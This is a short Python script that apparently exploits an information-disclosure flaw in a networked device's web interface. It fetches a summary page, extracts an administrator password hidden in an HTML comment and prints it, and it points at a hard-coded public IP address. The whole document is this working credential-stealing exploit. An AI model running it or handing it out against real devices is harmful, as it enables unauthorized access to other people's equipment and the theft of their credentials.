import socket
import requests
import re

def LeakPass(ip, port):
	header = {"User-Agent":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64;"}
	uri = "/BSW_wsw_summary.htm"
	url = "http://" + ip + ":" + str(port) + uri
	try:
		res = requests.get(url, headers=header, verify=False, timeout=8)
		data = res.content
	except Exception as e:
		pass
	respnose = data.find("<!-- CA")
	if respnose > -1:
		sign = data[respnose:respnose+500]
		passs = re.findall(">\S+<",sign,re.IGNORECASE)
		passwd = passs[1][1:-1]
		print "admin:"+passwd
	else:
		return None

if __name__ == "__main__":
	ip = "151.25.53.118"
	port = 10000
	LeakPass(ip,port,)





























